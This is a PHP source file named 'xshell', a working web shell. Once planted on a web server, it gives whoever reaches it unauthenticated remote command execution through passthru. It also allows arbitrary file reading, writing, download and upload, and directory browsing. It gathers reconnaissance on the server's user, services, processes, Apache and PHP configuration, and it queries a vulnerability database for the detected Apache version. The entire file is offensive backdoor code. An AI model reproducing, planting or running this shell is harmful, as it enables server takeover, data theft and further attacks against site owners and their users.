<?php
    /*
     * xshell 
     */

    function error_handler($errno, $errstr)
    {

    }

    //set_error_handler("error_handler");

    /* Gather information about the server */
    /* Find out who we are */
    //var_dump($_SERVER);
    $USER = posix_getpwuid(posix_geteuid());
    /*echo "I am {$USER['name']}<br />";
    echo "Document root: {$_SERVER['DOCUMENT_ROOT']}<br />";
    echo "My permissions in current directory: " . substr(sprintf('%o', fileperms($_SERVER['DOCUMENT_ROOT'])));*/
    clearstatcache();
    
    if (isset($_REQUEST['ajax']))
    {
        /* Handle an ajax request */
        if ($_REQUEST['ajax'] == 'info')
        {
            /* Assemble the appropriate data */
            /* User */
            $processUser = posix_getpwuid(posix_geteuid());
            /* Services */
            passthru('service --status-all');
            $_services = str_replace("\r", '', ob_get_clean()); // Remove output from buffer
            $_services = explode("\n", $_services);
            foreach ($_services as $s)
            {
                if (@$s[3] == '+')
                {
                    $services[] = substr($s, 8);
                }
            }
            foreach ($_services as $s)
            {
                if (@$s[3] != '+')
                {
                    $services[] = substr($s, 8);
                }
            }
            /* Free space */
            //passthru('df ' . $_SERVER['DOCUMENT_ROOT'] . ' -P');
            $free_space = ob_get_clean();
            /* Process */
            $ps = explode("\n", shell_exec("ps --no-headers -o cmd U " . $processUser['name']));
            $ps = explode(" ", $ps[0]);
            $ps = $ps[0];
            /* httpd root */
            $lines = explode("\n", shell_exec($ps . ' -V'));
            foreach ($lines as $line)
            {
                if (strpos($line, "-D HTTPD_ROOT") > 0)
                {
                    eval(str_replace("-D HTTPD_ROOT", '$httpd_root', $line) . ';');
                }
                if (strpos($line, "-D SERVER_CONFIG_FILE") > 0)
                {
                    eval(str_replace("-D SERVER_CONFIG_FILE", '$server_config_file', $line) . ';');
                }
            }
            /* Read config */
            $_server_config = preg_replace('/\s*#.*/', '', explode("\n", file_get_contents($httpd_root . '/' . $server_config_file)));
            foreach ($_server_config as $s)
            {
                if (strlen($s) > 0) $server_config .= trim($s) . "\n";
            }

            /* JSON-encode it */
            $ret = array(
                'server_software' => $_SERVER['SERVER_SOFTWARE'],
                'php_uname' => php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname ('v'),
                'user' => $processUser['name'],
                'filename' => $_SERVER['SCRIPT_FILENAME'],
                'document_root' => $_SERVER['DOCUMENT_ROOT'],
                'free_space' => $free_space,
                'services' => $services,
                'php_version' => PHP_VERSION,
                'system' => php_uname('a'),
                'extensions' => get_loaded_extensions(),
                'config' => parse_ini_file(php_ini_loaded_file()),
                'ps' => $ps,
                'httpd_root' => $httpd_root,
                'server_config' => $server_config
            );
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'dir')
        {
            $dir = realpath(realpath($_REQUEST['dir']) . DIRECTORY_SEPARATOR . @$_REQUEST['go']);
            if (@$_REQUEST['go'][0] == '/')
            {
                $dir = realpath($_REQUEST['go']);
            }
            $ret['dir'] = $dir;
            $files = scandir($dir);
            foreach ($files as $file)
            {
                if (is_dir(realpath($dir . DIRECTORY_SEPARATOR . $file)))
                {
                    $ret['dirs'][] = $file;
                }
                else
                {
                    $ret['files'][] = $file;
                }
            }
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'get')
        {
            echo file_get_contents($_REQUEST['get']);
        }
        if ($_REQUEST['ajax'] == 'download')
        {
            header('Pragma: public');
            header('Expires: 0');
            header('Content-Type: application/force-download');
            header('Content-Transfer-Encoding: binary');
            header('Content-Disposition: attachment; filename="' . basename($_REQUEST['download']) . '"');
            echo file_get_contents($_REQUEST['download']);
        }
        if ($_REQUEST['ajax'] == 'save')
        {
            file_put_contents($_REQUEST['save'], $_REQUEST['contents']);
        }
        if ($_REQUEST['ajax'] == 'getfileinfo')
        {
            $ret = array(
                'contents' => file_get_contents($_REQUEST['file']),
                'writeable' => is_writeable($_REQUEST['file'])
            );
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'upload')
        {
            move_uploaded_file($_FILES['file']['tmp_name'], $_REQUEST['upload']);
        }
        if ($_REQUEST['ajax'] == 'passthru')
        {
            passthru($_REQUEST['passthru']);
            $output = ob_get_clean();
            $ret['output'] = $output;
            $ret['cwd'] = getcwd();
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'config')
        {
            echo json_encode(parse_ini_file(php_ini_loaded_file()));
        }
        if ($_REQUEST['ajax'] == 'vulnerabilities')
        {
            // Get Apache version
            $processUser = posix_getpwuid(posix_geteuid());
            $username = $processUser['name'];
            $ps = explode("\n", shell_exec("ps --no-headers -o cmd U " . $processUser['name']));
            $ps = explode(" ", $ps[0]);
            $ps = $ps[0];
            preg_match('#(?:Apache/)(\d+\.\d+\.\d+)#', shell_exec($ps . ' -v'), $matches);
            $version = $matches[1];
            // Search for Apache vulns
            $osvdb = file_get_contents("http://www.osvdb.org/search?search%5Bvuln_title%5D=Apache+" . $version . "&search%5Btext_type%5D=alltext");
            preg_match('$(?:<a href="/show/osvdb/)(\d+)(?:.*?<a href="#" onclick="Element\.toggle\(\'desc\d+\'\);; return false;">)(.*?)(?:</a>)$s', $osvdb, $matches);
            for ($i = 1; $i < count($matches); $i += 2)
            {
                $ret[$matches[$i]] = $matches[$i + 1];
            }
            echo json_encode($ret);
        }
        die();
    }
    else
    {
        include('template.html');
    }
?>